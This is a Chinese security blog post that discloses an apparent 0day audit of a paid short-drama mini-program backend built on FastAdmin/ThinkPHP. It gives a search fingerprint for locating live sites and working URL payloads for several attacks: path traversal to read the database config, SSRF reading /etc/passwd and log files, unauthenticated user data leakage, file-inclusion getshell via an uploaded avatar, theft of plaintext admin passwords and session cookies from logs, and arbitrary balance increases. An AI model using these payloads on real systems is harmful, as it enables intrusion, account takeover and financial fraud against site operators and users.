#  某付费短剧影视小程序后端审计(0day)   
原创 Mstir  星悦安全   2024-07-06 16:03  
  
0x00 前言  
  
**█ 远山起风又起雾，无人知我来时路 █**  
  
**公网上的后端较少，一般都在二级目录下，搜索引擎找不到，实战中可通过小程序查到后端**  
  
**Fofa:"无铭科技"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnX5B3x7RWvzLSfLUbUlfww8JfttmTUQOJQnfp1fIhs7uW4ML2uwPxbHA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXDEtIwiaEHqiaIuSibD0xnjTzR8OUqJkOOJe8IdWBVISvKlYJ07XJgzfnQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXGk7E0YWxyCExgicW5x8vxazyMlDPWwKJ3GgtEH2hgTia9sz7SJnAibtww/640?wx_fmt=png&from=appmsg "")  
  
**框架:Thinkphp 5.0.24,Fastadmin Debug:True**  
## 0x01 前台任意文件读取  
  
**框架为fastadmin写的，正好最近fastadmin出了个任意文件读取的洞，直接就可以打，在/application/index/controller/Ajax.php 中，传入参数后进入到了loadlang()函数，我们追踪一下.**  
```
/**
 * Ajax异步请求接口
 * @internal
 */
class Ajax extends Frontend
{

  protected $noNeedLogin = ['lang'];
  protected $noNeedRight = ['*'];
  protected $layout = '';

  /**
     * 加载语言包
     */
  public function lang()
{
    header('Content-Type: application/javascript');
    header("Cache-Control: public");
    header("Pragma: cache");

    $offset = 30 * 60 * 60 * 24; // 缓存一个月
    header("Expires: " . gmdate("D, d M Y H:i:s", time() + $offset) . " GMT");

    $controllername = input("controllername");
    $this->loadlang($controllername);
    //强制输出JSON Object
    $result = jsonp(Lang::get(), 200, [], ['json_encode_param' => JSON_FORCE_OBJECT | JSON_UNESCAPED_UNICODE]);
    return $result;
  }
```  
  
**进入到了 /common/controller/Api.php 的loadlang中，直接调用Load函数包含../lang/xxx.php 文件**  
```
/**
* 加载语言文件
* @param string $name
*/
protected function loadlang($name)
{
  $name =  Loader::parseName($name);
  Lang::load(APP_PATH . $this->request->module() . '/lang/' . $this->request->langset() . '/' . str_replace('.', '/', $name) . '.php');
}
```  
  
**所以我们只需要传入lang=../../application/database 即可跨目录读取数据库文件.**  
  
**Payload:**  
```
/index/ajax/lang?lang=../../application/database
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnX9ckLBPffwSGiafle58W9YgxF9THia96nMECichzePiayaZBhPHuKzFZjYg/640?wx_fmt=other&from=appmsg "")  
## 0x02 前台任意文件读取+SSRF  
  
**在/api/controller/Ems.php 控制器中的 juhecurl 方法存在Curl_exec函数，并且传参可控，导致前台任意文件读取+SSRF漏洞的产生.**  
```
/**
* 请求接口返回内容
* @param  string $url [请求的URL地址]
* @param  string $params [请求的参数]
* @param  int $ipost [是否采用POST形式]
* @return  string
*/
function juhecurl($url,$params=false,$ispost=0){
  $httpInfo = array();
  $ch = curl_init();
  curl_setopt( $ch, CURLOPT_HTTP_VERSION , CURL_HTTP_VERSION_1_1 );
  curl_setopt( $ch, CURLOPT_USERAGENT , 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22' );
  curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT , 30 );
  curl_setopt( $ch, CURLOPT_TIMEOUT , 30);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER , true );
  if( $ispost )
  {
    curl_setopt( $ch , CURLOPT_POST , true );
    curl_setopt( $ch , CURLOPT_POSTFIELDS , $params );
    curl_setopt( $ch , CURLOPT_URL , $url );
  }
  else
  {
    if($params){
      curl_setopt( $ch , CURLOPT_URL , $url.'?'.$params );
    }else{
      curl_setopt( $ch , CURLOPT_URL , $url);
    }
  }
  $response = curl_exec( $ch );
  if ($response === FALSE) {
    //echo "cURL Error: " . curl_error($ch);
    return false;
  }
  $httpCode = curl_getinfo( $ch , CURLINFO_HTTP_CODE );
  $httpInfo = array_merge( $httpInfo , curl_getinfo( $ch ) );
  curl_close( $ch );
  return $response;
}
```  
  
**Payload:**  
```
/api/Ems/juhecurl?url=file:///etc/passwd
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXLzNk1Cjw2FXHNzPERXXfibwz7W12rSxRtKf8pibUo9h8rzEHH3xXCq9A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXQeb8nxaVCfuIhVIoQ3CDRrSicebSvfiblicD3b6ygBVn3jXALD7zkNN7A/640?wx_fmt=png&from=appmsg "")  
## 0x03 前台敏感信息泄露  
  
**在 /api/controller/Index.php 控制器的index方法中，很明显地存在 where 查询网站信息及User表中的字段，并且将所有用户枚举出来，且因为 $noNeedLogin = ['*'] 导致所有接口都无权限验证.**  
```
<?php
namespace app\api\controller;
use app\common\controller\Api;
/**
 * 首页接口
 */
class Index extends Api
{
  protected $noNeedLogin = ['*'];
  protected $noNeedRight = ['*'];

  /**
     * 首页
     *
     */
  public function index()
{
    $config=$this->config();
    $configs=config('site');
    $map['ishot']=2;
    $map['endtimesjc']=['>',time()];
    if(input('uid',0)>0){
      $map['uid']=input('uid');
    }
    $list =  model('Task')
      ->with('users')
      ->where($map)
      ->limit(10)
      ->select();
    if($list){
      foreach ($list as $k=>$v){
        $list[$k]['createtime']=date('Y-m-d H:i',$v['createtime']);
        if(isset($v['users']['avatar'])){
          if(strpos($v['users']['avatar'],'http') !== false){ 
            $list[$k]['avatar']=$v['users']['avatar'];
          }else{
            if($v['users']['avatar']){
              $list[$k]['avatar']= $configs['imgurl'].$v['users']['avatar'];
            }else{
              $list[$k]['avatar']=$configs['imgurl'].'/uploads/20200523/250b3f89b40ff3714b07cc51b4c2f63d.png';
            }
          } 
        }else{
          $list[$k]['avatar']=$configs['imgurl'].'/uploads/20200523/250b3f89b40ff3714b07cc51b4c2f63d.png';
        }


      }
    }
    $data=['config'=>$config,'doctor'=>$list];
    $this->success('请求成功',$data);
  }
```  
Payload:```
/api/index
```  
  
**里边了加盐的MD5密码以及邮箱地址.**  
  
****  
0x04 Fastadmin Getshell  
  
**在查看ThinkPHP 框架控制器本身是否存在漏洞的同时，也要看看是否有Fastadmin,Thinkadmin这种后台框架的使用，这种后台框架也是可能存在漏洞的.**  
  
**很幸运，这套系统是用的Fastadmin作为后台框架，且开了前台用户注册，满足历史漏洞条件.**  
  
**在 /index/controller/User.php 中的_empty方法可控，导致传入到fetch函数，造成任意文件包含.**  
```
/**
* 空的请求
* @param $name
* @return mixed
*/
public function _empty($name)
{
    $data = Hook::listen("user_request_empty", $name);
    foreach ($data as $index => $datum) {
      $this->view->assign($datum);
    }
    return $this->view->fetch('user/' . $name);
  }
```  
  
**追踪一下fetch函数，内置模板引擎的fetch方法， 这个方法实际上就是将要输出的页面内容赋值给一个变量，为了方便，thinkphp在对模板渲染的过程中，添加了php标签功能，使得其可以解析php代码**  
```
public function fetch($template, $data = [], $config = [])
{
    if ('' == pathinfo($template, PATHINFO_EXTENSION)) {
      // 获取模板文件名
      $template = $this->parseTemplate($template);
    }
    // 模板不存在 抛出异常
    if (!is_file($template)) {
      throw new TemplateNotFoundException('template not exists:' . $template, $template);
    }
    // 记录视图信息
    App::$debug && Log::record('[ VIEW ] ' . $template . ' [ ' . var_export(array_keys($data), true) . ' ]', 'info');
    $this->template->fetch($template, $data, $config);
  }
```  
  
**所以我们首先需要在 /index/user/register.html 注册一个账号，然后登录，之后点Profile-Click to edit上传头像，符合其规则即可.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXO7j0pQuwuia1WOyHhApwPT9ltDafxiaZ8XYGrWQWWSpB3AAMPbvhZseA/640?wx_fmt=png&from=appmsg "")  
  
**之后可以通过F12追踪标签或者查看源码拿到上传的图片地址**  
  
****  
**之后咱们就可以直接通过 _empty 来包含文件实现Getshell了**  
  
**Payload:**  
```
/index/user/_empty?name=../上传的图片地址
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXF2OSPmicIAjvqLfuzwW4IhFtdXy3qq7GIRVVMWomHc60ylmBibiclg3dA/640?wx_fmt=other&from=appmsg "")  
  
**当然，由于利用链其本身的缺陷，只能在Windows 下实现包含效果，这里网上文章有详细分析，不多说了.**  
  
0x05 任意文件读取+Log日志泄露组合拳  
  
**这套系统开了Debug，同时也开了日志记录，也就是说在 /runtime/log/ 目录下会实时生成日志，包括管理员的访问日志也在其中，正常来说网站是绑定在Public目录下的，咱们无法读取，但可以通过任意文件读取漏洞来跨目录读取这些日志.**  
  
**Payload:**  
```
/api/ems/juhecurl?url=file:///D:/phpstudy_pro/WWW/runtime/log/202406/29.log
```  
  
**Windows下需要打个绝对路径，直接让网站报错即可，Linux下只需 ../ 跨出去即可**  
  
**这里日志规则为: /年(4位)月(2位)/日(2位).log**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXibY6kribP4d25nAgk3QzvmBHl2dLK0BibUwbiaBIkEbdnFYxd2FtadVhag/640?wx_fmt=other&from=appmsg "")  
  
**直接读取看起来是没有换行啥的，咱们直接Ctrl+S保存网页到本地即可，打开是有换行的，这里能看到登录时明文的账号密码，直接Ctrl+F搜索 tannuoyun.php 即可找到管理员日志**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnX0OTHShTTRlzuVYicxHyNt7CJQruBX7Qap1IM5ibb9cOz1hsL1Y9KNa9g/640?wx_fmt=png&from=appmsg "")  
  
**而且还能看到管理员登录成功之后的Cookie，直接替换即可登录进入.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnX7XrL8sFHG1A80L4ufupPsm3c9udz7XjbGHCK3EMEApbuPhEOf4exkA/640?wx_fmt=png&from=appmsg "")  
  
0x06 前台鸡肋文件上传  
  
**在 /api/controller/Common.php 控制器的base64_image_content方法，是一处很明显的文件上传点，且未对权限进行控制，只需要普通用户权限即可上传任意文件.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnXG3oZGjYDrR53ibgRkLUXpZas4EB9JHpZ95NF3G6iaFDx1WTekf6oc2UQ/640?wx_fmt=png&from=appmsg "")  
  
**但是问题就出在了 uploads目录下有个 .htaccess 限制了php文件解析**  
```
<FilesMatch \.(?i:html|php)$>
  Order allow,deny
  Deny from all
</FilesMatch>
```  
  
**所以直接访问会出现 module not exists:error 不解析**  
  
****  
**但是可以作为Fastadmin中文件包含的上传点来使用，若其头像接口被限制，使用该接口也可以上传.**  
  
0x07 前台水平越权漏洞  
  
**在 /api/controller/Mytask.php 控制器中，money方法存在逻辑缺陷，仅验证了用户的Session，其money user_id id 均可控，导致登陆后可随意增加任意用户金钱.**  
```
public function money($money,$user_id,$id,$sxf=0){
  $user = $this->Usermodel::get($user_id);
  if ($user && $money != 0) {
    $before = $user->money;
    $after = $user->money + $money;
    //更新会员信息
    $user->save(['money' => $after]);
    //写入日志
    MoneyLog::create(['user_id' => $user_id, 'money' => $money, 'before' => $before, 'after' => $after,'fid' => $id, 'sxf' =>$sxf,'memo' => '用户佣金']);
  }else{
    $this->error(__('金额不对')); 
  }
}
```  
  
**其中user_id 可以在Cookie中查看到，只需要知道对方id，即可给对方或自己随便增加金钱**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5crzQm1ica4uibkrn9xtfibWnX3umfPCSw2ufI8uG6IiauibJysYBLoicpyvEaNINPApibMsCJmEtpW9XSJw/640?wx_fmt=png&from=appmsg "")  
  
**Payload:**  
```
/api/mytask/money?money=12345&user_id=1550&id=1550
```  
  
审计源码可关注公众号发送 24 获取  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HVNK6rZ71oofHnCicjcYq2y5pSeBUgibJg8K4djZgn6iaWb6NGmqxIhX2oPlRmGe6Yk0xBODwnibFF8XCjxhEV3K7w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
    **文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
